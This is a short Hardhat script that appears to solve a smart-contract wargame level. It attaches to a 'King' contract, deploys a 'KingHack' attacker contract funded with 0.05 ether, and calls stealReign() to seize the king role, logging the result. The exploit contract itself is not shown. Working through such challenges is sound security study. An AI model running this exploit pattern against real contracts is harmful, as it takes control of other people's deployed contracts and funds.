// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  const kingInstanceAddr = "0xD72eBEc102845Acdd88598b8EafaE84893C04Dd6";
  const King = await hre.ethers.getContractFactory("King");
  const kingInstance = await King.attach(kingInstanceAddr);

  const KingHack = await hre.ethers.getContractFactory("KingHack");
  const kingHack = await KingHack.deploy(kingInstance.address, { value: hre.ethers.utils.parseEther("0.05") });

  console.log("Current king:", await kingInstance._king());
  console.log("King hacker contract address:", kingHack.address);
  console.log("Stealing reign...");

  await kingHack.stealReign({ gasLimit: 760000 });
  console.log("Current king:", await kingInstance._king());
  console.log("Reign stolen:", (await kingInstance._king()) === kingHack.address);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
